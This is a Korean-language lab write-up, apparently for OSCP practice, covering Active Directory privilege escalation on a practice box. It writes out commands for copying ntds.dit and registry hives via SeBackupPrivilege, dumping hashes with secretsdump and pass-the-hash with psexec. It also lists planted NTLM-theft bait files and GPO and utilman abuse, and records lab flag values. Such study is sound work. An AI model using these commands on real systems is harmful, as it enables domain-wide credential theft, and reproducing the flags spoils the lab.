`whoami /priv` 에 `SeBackupPrivilege` 도 `Enabled` 임. 이 특권은 백업 목적이라 **모든 파일을 DACL 을 무시하고 읽을 수 있음.** DC 에서 가장 중요한 파일은 `C:\Windows\NTDS\ntds.dit` — 도메인의 모든 계정 해시(`krbtgt` 포함)가 든 AD 데이터베이스임. 평소에는 잠겨 있고 ACL 로 보호되지만 `SeBackupPrivilege` 앞에서는 둘 다 무력함. `ntds.dit`(암호화됨) + `SYSTEM` 하이브(복호화 키)를 함께 뽑아 `secretsdump` 에 넣으면 **DCSync 와 동일한 결과**를 얻음.

⚠️ **아래 절차는 이 박스에서 끝까지 실행하지 않았음.** GPO 경로로 이미 풀렸기 때문임. Kali 산출물에 `ntds.dit`·`secretsdump` 결과가 하나도 없고, `~/git/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/` 의 DLL 두 개는 mtime 이 **2026-07-08 13:49:45** — RDP 로 SYSTEM 을 잡은 뒤(13:40)에야 클론된 것이라 **준비까지만 하고 멈춘 것**이 시각으로 확인됨.

DLL 이 실제로 손에 있었다는 것은 확인됨:

```bash
┌──(kali㉿kali)-[~/…/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug]
└─$ ls
SeBackupPrivilegeCmdLets.dll  SeBackupPrivilegeUtils.dll

┌──(kali㉿kali)-[~/…/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug]
└─$ pwd
/home/kali/git/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug
```

절차의 형태만 남김 — **아래 블록들의 출력은 관측한 것이 아니고, 명령도 이 박스에서 실행되지 않았음.** 라이브 파일이라 일반 복사는 실패하므로 두 방법 중 하나를 씀.

방법 (a) — `SeBackupPrivilege` 전용 cmdlet:

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege C:\Windows\NTDS\ntds.dit C:\temp\ntds.dit -Overwrite
reg save hklm\system C:\temp\system.hive
```

방법 (b) — diskshadow 로 볼륨 섀도카피를 만든 뒤 백업 모드로 복사(외부 DLL 불필요):

```powershell
echo set context persistent nowriters > C:\temp\ds.txt
echo add volume c: alias raj >> C:\temp\ds.txt
echo create >> C:\temp\ds.txt
echo expose %raj% z: >> C:\temp\ds.txt
diskshadow /s C:\temp\ds.txt
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
reg save hklm\system C:\temp\system.hive
```

`robocopy` 의 **`/b`(backup mode)가 있어야** `SeBackupPrivilege` 를 사용해 잠기고 보호된 파일을 읽음. 없으면 일반 복사가 되어 `ntds.dit` 가 사용 중이라 거부됨. 같은 이유로 방법 (a)는 `Copy-Item` 이 아니라 `Copy-FileSeBackupPrivilege` 를 씀.

로컬 하이브를 함께 뽑으면 로컬 계정·LSA 시크릿도 나옴:

```powershell
reg save hklm\sam C:\temp\sam.hive
reg save hklm\security C:\temp\security.hive
```

Kali 로 내려 해시 추출:

```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
```

나온 Administrator NT 해시로 PtH, 또는 `krbtgt` 해시로 골든 티켓:

```bash
impacket-psexec -hashes :<Admin_NThash> vault.offsec/Administrator@192.168.120.172
```

#### 세 경로 우열

| | A: GPO ACL (실사용) | B: SeRestore (utilman, 완주) | C: SeBackup (ntds.dit, 미실행) |
|---|---|---|---|
| 근거 출처 | BloodHound JSON·그래프 | `whoami /priv` | `whoami /priv` |
| 업로드 | `SharpGPOAbuse.exe` 1개 | 없음 | DLL 2개 또는 없음(diskshadow) |
| 얻는 것 | 이 DC 의 로컬 관리자 | 이 DC 의 SYSTEM | 도메인 전체 해시(`krbtgt` 포함) |
| 전제조건 | 없음 | **RDP `nla:False`** | 없음 |
| 남는 흔적 | GPO Restricted Groups 변경 | `System32` 바이너리 치환 | 임시 파일·섀도카피 |
| 시험 가치 | 중간 | 낮음 | **가장 높음** — 골든티켓·크로스호스트 PtH 로 확장 |

시험이라면 **C(SeBackup)를 노림** — `krbtgt` 해시까지 얻으면 도메인을 영구 장악하고 다른 호스트로의 피벗까지 한 번에 열림. 이 박스는 단일 호스트라 A 로 충분했음.

**셸을 잡은 첫 1분에 두 명령이 방향을 정함** — `whoami /priv`(특권 기반 경로)와 BloodHound 아웃바운드 엣지(ACL 기반 경로). 이 박스는 두 경로가 모두 열려 있어 어느 쪽으로 가도 SYSTEM 에 닿았음. 실마리가 없을 때의 열거 순서는 [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]].

### Post-Exploitation

**Proof.txt value:**
`714b4d1566a4bc88b9a0f45c33b36f0b`

GPO 경로로 얻은 Administrator 세션(evil-winrm)에서 읽은 값임. ⚠️ 17분 뒤 utilman/RDP 경로의 SYSTEM 셸에서 같은 파일을 읽었을 때는 **`74a1ddd00c6d187cf4f787c14d5cbde1`** 이 나왔음 — 두 값 모두 실측이고 그 사이에 무슨 일이 있었는지는 확정할 근거가 없음 `[가정]`.

둘 다 표준 위치(`C:\Users\Administrator\Desktop\proof.txt`)에서, 둘 다 **대화형 셸**(evil-winrm PS 프롬프트 · RDP cmd 창)에서 읽었음. 웹셸 경유가 아니므로 시험 규정상 유효함.

| 플래그 | 경로 | 값 | 읽은 계정 |
|---|---|---|---|
| `local.txt` | `C:\Users\anirudh\Desktop\local.txt` | `5a3377f8afb97ee39a988c201052df14` | `vault.offsec\anirudh` (WinRM) |
| `proof.txt` | `C:\Users\Administrator\Desktop\proof.txt` | `714b4d1566a4bc88b9a0f45c33b36f0b` | `Administrator` (GPO 후 재로그온 WinRM) |
| `proof.txt` (재관측) | 동일 | `74a1ddd00c6d187cf4f787c14d5cbde1` | `nt authority\system` (utilman/RDP) |

⚠️ 이 박스는 **`whoami`/`hostname`/`ipconfig` 를 플래그와 한 화면에 묶는 증거 형식으로 캡처하지 않았음.** RDP 화면만 `whoami` + `type proof.txt` 를 연달아 담고 있음. 신규 박스에서는 `whoami; hostname; ipconfig; date; type <플래그>` 를 한 명령으로 묶어 출력을 파일로 떨어뜨릴 것.

**남긴 흔적**

타겟 인스턴스는 Stop 하면 파괴되므로 원복 대상이 아님. 무엇을 심었는지만 기록함.

- `\\vault.offsec\DocumentsShare\` — `ntlm_theft` 미끼 **24개**(`steal.scf`·`desktop.ini`·`Autorun.inf`·`steal.library-ms`·`steal.lnk`·`steal-(url).url`·`steal-(icon).url`·`steal.rtf`·`steal.htm`·`steal-(handler).htm`·`steal-(stylesheet).xml`·`steal-(fulldocx).xml`·`steal-(includepicture).docx`·`steal-(remotetemplate).docx`·`steal-(frameset).docx`·`steal-(externalcell).xlsx`·`steal.m3u`·`steal.asx`·`steal.wax`·`steal.jnlp`·`steal.application`·`steal.pdf`·`steal.theme`·`zoom-attack-instructions.txt`) + 쓰기 확인용 `test.txt`(5바이트)
- `Default Domain Policy` GPO — `GptTmpl.inf` 의 Restricted Groups 에 anirudh SID 추가 + GPC/GPT `versionNumber` 증가. 원복하려면 SharpGPOAbuse 역작업 또는 `GptTmpl.inf` 편집 + 버전 정정이 필요함
- DC 로컬 Administrators 에 `anirudh` — GPO 를 원복하고 정책을 재적용하면 빠짐
- `C:\Windows\System32\utilman.exe` 치환 — 원본은 `utilman.old` 로 남아 있음. **`cmd.exe` 도 `Utilman.exe` 로 이름이 바뀌어 원래 자리에 없음**
- `C:\Users\anirudh\Desktop\SharpGPOAbuse.exe`
- Kali 쪽 — `~/PG/Vault/`(`nmap.log`·`udp.txt`·`hash.txt`·`test.txt`·BloodHound JSON 7종) · `~/git/ntlm_theft/steal/` 미끼 원본 · `~/git/SharpGPOAbuse/` · `~/git/SeBackupPrivilege/`. 리버스셸을 쓰지 않아 리스너·tmux 잔존물 없음. NFS 마운트 없음

**작업 시각 복원** (파일 mtime + 스크린샷 붙여넣기 시각)

| 시각 | 사건 | 근거 |
|---|---|---|
| 09:15:26 → 09:17:38 | TCP `-p-` 스캔(131.55초) | `nmap.log` |
| 10:15:26 → 10:15:30 | UDP top-100(3.39초) | `udp.txt` |
| 10:22:16 | 미끼 24개 생성 | `~/git/ntlm_theft/steal` mtime |
| 10:28:29 | NetNTLMv2 회수 | `hash.txt` mtime |
| 10:38:11 | `test.txt` 업로드(공유는 이 시점에 비어 있었음) | 서버측 타임스탬프 |
| 10:49:42 | `local.txt` 화면 | 스크린샷 파일명 |
| 12:49:27 → 12:49:45 | BloodHound JSON 7종 | JSON mtime |
| 13:20:07 | SharpGPOAbuse 성공(앞선 실패 2회 포함) | 스크린샷 파일명 |
| 13:23:20 | `proof.txt`(WinRM) | 스크린샷 파일명 |
| 13:40:45 | `proof.txt`(utilman/RDP, 다른 값) | 스크린샷 파일명 |
| 13:49:45 | SeBackupPrivilege DLL 클론 | DLL mtime |

⚠️ **스크린샷 파일명은 붙여넣기 시각이지 캡처 시각이 아님.** 실제로 mput 화면(10:35:37)이 미끼 생성 화면(10:35:51)보다 먼저 붙여넣어져 순서가 역전돼 있음. 위 표에서 파일 mtime 근거는 사건 시각 그 자체이고, 스크린샷 근거는 **상한**임.
⚠️ `Pasted image 20260708103351.png` 와 `…103353.png` 는 크기가 28759바이트로 동일한 **중복 붙여넣기**라 노트에는 하나만 임베드했음.

## 관련

- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) — 미끼 24종 생성기
- [MS-NLMP](https://learn.microsoft.com/openspecs/windows_protocols/ms-nlmp/) — NetNTLMv2 blob·AV_PAIR 규격
- [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) — 이 박스는 [byronkg 포크](https://github.com/byronkg/SharpGPOAbuse)의 컴파일본 사용
- [pygpoabuse](https://github.com/Hackndo/pygpoabuse) · [SeBackupPrivilege cmdlets](https://github.com/giuliano108/SeBackupPrivilege) · [impacket](https://github.com/fortra/impacket)
- [BloodHound.py](https://github.com/dirkjanm/BloodHound.py) · [Responder](https://github.com/lgandx/Responder)
- [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) — 웹셸로 얻은 플래그는 0점
- CVE 없음 — 설정(익명 쓰기 공유)과 ACL(GPO 위임)만으로 뚫림
- [[_PLAYBOOK#A-51. AD 박스에서 막히면 «취약점»이 아니라 넷을 먼저 본다]] · [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]]
- [[_PLAYBOOK#B-53. 유효한 도메인 자격증명 «하나»를 얻으면 즉시 BloodHound를 돌린다]] · [[_PLAYBOOK#B-54. DC 컴퓨터 객체에 붙은 저권한 ACE는 곧 도메인 장악이다]] · [[_PLAYBOOK#B-51. «사용자 설명 필드»는 AD 의 자격증명 저장소다]]
- [[Heist]] — 같은 세션에 푼 자매 박스. 강제 인증 → NetNTLMv2 → 크랙 → WinRM 구조가 판박이인데 **트리거가 웹 `?url=`(HTTP)이고 권한상승이 gMSA + SeRestore** 임. `MsvAvTargetName` 의 `HTTP/` vs `cifs/` 가 두 박스를 가름
- [[Resourced]] — 이 박스 작업 중 IP(`.175`)가 잔류해 명령이 섞여 들어간 앞 박스. Kerberos 시계 동기·ccache
- [[Hutch]] — AD ACL 악용 계열 · [[Nagoya]] — 같은 세션의 AD 박스, 티켓 위조
- [[Butch]] — 웹셸 플래그 0점 규정
- [[_WRITEUP-STANDARD]] · [[_STATUS]]
- [[_PLAYBOOK#A-1-30. 익명 SMB 는 표기가 넷임 — 하나만 쳐보고 배제하지 말 것]] · [[_PLAYBOOK#A-6-12. 같은 파일의 플래그를 두 번 읽었는데 값이 다르다]] · [[_PLAYBOOK#A-6-13. 도구가 `Unknown argument error` 만 뱉고 어느 인자가 틀렸는지 안 알려준다]] · [[_PLAYBOOK#B-57. 쓰기 가능한 SMB 공유는 저장소가 아니라 «자격증명 덫»이다 — 강제 인증]] · [[_PLAYBOOK#B-58. GPO 쓰기 권한 = 그 GPO 가 적용되는 모든 머신에서 SYSTEM]]
